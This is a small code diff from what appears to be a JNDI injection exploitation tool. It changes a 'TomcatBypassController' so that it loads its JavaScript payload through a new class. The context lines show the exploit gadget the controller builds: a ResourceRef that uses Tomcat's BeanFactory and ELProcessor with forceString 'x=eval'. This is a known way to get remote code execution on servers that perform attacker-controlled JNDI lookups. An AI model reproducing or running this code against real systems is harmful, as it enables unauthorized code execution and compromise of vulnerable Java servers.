@@ -3,7 +3,7 @@ package map.jndi.controller.bypass;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.controller.BasicController;
-import map.jndi.util.PayloadUtil;
+import map.jndi.payload.JavaScriptPayload;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
@@ -15,7 +15,7 @@ public class TomcatBypassController extends BasicController {
     public Object process(byte[] byteCode) {
         System.out.println("[Reference] Factory: BeanFactory + ELProcessor");
 
-        String code = PayloadUtil.getJavaScriptPayload(byteCode);
+        String code = JavaScriptPayload.loadClass(byteCode);
 
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
